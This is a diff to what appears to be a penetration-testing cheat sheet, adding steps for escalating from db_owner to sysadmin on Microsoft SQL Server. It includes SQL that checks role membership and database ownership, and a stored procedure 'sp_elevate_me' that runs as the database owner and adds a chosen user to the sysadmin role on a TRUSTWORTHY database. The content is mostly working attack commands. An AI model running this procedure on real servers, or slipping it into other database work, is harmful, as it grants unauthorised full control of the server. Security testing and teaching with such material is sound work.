@@ -1540,15 +1540,31 @@ Get-SQLServerLinkCrawl -Instance <INSTANCE> -Verbose -Query 'SELECT distinct b.n
 ```
  
 ### Create Stored procedure as DB_Owner
+- Prerequisites:
+ - db_owner role
+ - owner of the database high privileged user
+ - Database set to thrustworthy
+ 
+#### Check the db_owner role
+```
+select rp.name as database_role, mp.name as database_user
+from sys.database_role_members drm
+join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
+join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
+```
+ 
+#### Check the owner of the database
+```
+SELECT suser_sname(owner_sid), * FROM sys.databases
+```
+ 
 #### Create a stored procedure
 ```
-USE <DB>
-GO
+USE <DB>;
 CREATE PROCEDURE sp_elevate_me
 WITH EXECUTE AS OWNER
 AS
 EXEC sp_addsrvrolemember '<USER TO MAKE SYSADMIN>','sysadmin'
-GO
 ```
 
 #### Execute procedure
